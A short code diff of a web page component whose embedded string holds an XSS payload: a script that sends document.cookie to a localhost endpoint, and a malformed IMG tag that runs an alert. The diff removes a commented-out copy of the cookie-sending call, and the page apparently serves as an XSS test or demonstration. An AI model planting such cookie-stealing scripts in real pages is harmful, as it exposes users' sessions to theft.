@@ -5,11 +5,6 @@ export default function CustomPage() {
     <script>fetch("http://localhost:3000/api/example", { method: "POST", headers: { "Content-Type": "application/json", }, body: JSON.stringify({ cookies: document.cookie })})</script>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
   `
-  // fetch("http://localhost:3000/api/example", {
-  //   method: "POST",
-  //   headers: { "Content-Type": "application/json" },
-  //   body: JSON.stringify({ cookies: document.cookie }),
-  // });
     return (
         <div>
             <h1>Custom Page</h1>
